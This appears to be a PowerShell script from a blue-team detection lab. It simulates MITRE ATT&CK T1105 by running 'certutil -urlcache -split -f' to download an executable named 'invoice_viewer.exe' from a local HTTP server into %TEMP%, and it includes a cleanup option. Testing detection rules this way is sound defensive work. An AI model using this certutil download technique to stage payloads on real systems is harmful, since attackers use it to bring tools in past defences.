<#
.SYNOPSIS
    Simulates Scenario A2: Ingress Tool Transfer via certutil.exe (MITRE ATT&CK T1105)

.DESCRIPTION
    Harmlessly simulates an attacker using the signed Microsoft utility certutil.exe
    to download a second-stage payload into %TEMP% from a local HTTP server:
    1. Ensures local files/ server is available or targets specified host-only IP.
    2. Runs certutil -urlcache -split -f http://<ip>:8000/invoice_viewer.exe %TEMP%\invoice_viewer.exe
    3. Prints UTC start timestamp and file existence verification.
    4. Supports -Cleanup switch to purge downloaded file and clear certutil cache.
#>

[CmdletBinding()]
param(
    [string]$ServerIp = "127.0.0.1",
    [int]$Port = 8000,
    [switch]$Cleanup
)

$TempDir = [System.IO.Path]::GetTempPath()
$DestinationFile = Join-Path $TempDir "invoice_viewer.exe"
$SourceUrl = "http://${ServerIp}:${Port}/invoice_viewer.exe"

if ($Cleanup) {
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host " Cleaning up Scenario A2 artifacts..." -ForegroundColor Yellow
    Write-Host "==========================================================" -ForegroundColor Cyan

    if (Test-Path $DestinationFile) {
        Remove-Item $DestinationFile -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Removed: $DestinationFile" -ForegroundColor Green
    } else {
        Write-Host "[-] File not found: $DestinationFile" -ForegroundColor Gray
    }

    Write-Host "[*] Purging certutil URL cache..." -ForegroundColor Gray
    certutil.exe -urlcache "$SourceUrl" delete | Out-Null
    certutil.exe -urlcache * delete | Out-Null
    Write-Host "[+] Certutil cache cleared." -ForegroundColor Green
    exit 0
}

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host " Simulating Scenario A2: Ingress Tool Transfer (certutil)" -ForegroundColor Yellow
Write-Host " MITRE ATT&CK: T1105 (Ingress Tool Transfer)" -ForegroundColor Gray
Write-Host "==========================================================" -ForegroundColor Cyan

# 1. Record UTC start time
$UtcStartTime = [System.DateTime]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.ffffffZ")
Write-Host "[1/3] Attack started at UTC: $UtcStartTime" -ForegroundColor Gray

# 2. Check/Start local HTTP test server if targeting localhost and port not listening
$ServerProcess = $null
$TcpClient = New-Object System.Net.Sockets.TcpClient
$IsPortListening = $false
try {
    $TcpClient.Connect($ServerIp, $Port)
    $IsPortListening = $true
    $TcpClient.Close()
} catch {
    $IsPortListening = $false
}

if (-not $IsPortListening -and ($ServerIp -eq "127.0.0.1" -or $ServerIp -eq "localhost")) {
    $FilesDir = Join-Path $PSScriptRoot "files"
    if (Test-Path $FilesDir) {
        Write-Host "[*] Starting local HTTP server on port $Port serving $FilesDir..." -ForegroundColor Gray
        $ServerProcess = Start-Process -FilePath "python" -ArgumentList "-m http.server $Port --directory `"$FilesDir`"" -PassThru -WindowStyle Hidden
        Start-Sleep -Seconds 1
    }
}

# 3. Execute certutil download command (triggers Sysmon & Sigma rule)
Write-Host "[2/3] Executing certutil download command..." -ForegroundColor Yellow
Write-Host "      Command: certutil.exe -urlcache -split -f `"$SourceUrl`" `"$DestinationFile`"" -ForegroundColor Cyan

$CertutilOutput = certutil.exe -urlcache -split -f "$SourceUrl" "$DestinationFile" 2>&1
$CertutilExitCode = $LASTEXITCODE

# If we spawned the local server, shut it down after download
if ($ServerProcess -and -not $ServerProcess.HasExited) {
    Stop-Process -Id $ServerProcess.Id -Force -ErrorAction SilentlyContinue
}

# 4. Verify results
$FileExists = Test-Path $DestinationFile
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host " Attack Execution Proof" -ForegroundColor Yellow
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "UTC Start Time:          $UtcStartTime" -ForegroundColor Green
Write-Host "Target URL:              $SourceUrl" -ForegroundColor Gray
Write-Host "Destination:             $DestinationFile" -ForegroundColor Gray
Write-Host "File Exists on Disk:     $FileExists" -ForegroundColor $(if ($FileExists) { "Green" } else { "Red" })
Write-Host "Certutil Exit Code:      $CertutilExitCode" -ForegroundColor $(if ($CertutilExitCode -eq 0) { "Green" } else { "Yellow" })
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "Check your BlueTeamAI Web UI at: http://127.0.0.1:8766" -ForegroundColor Cyan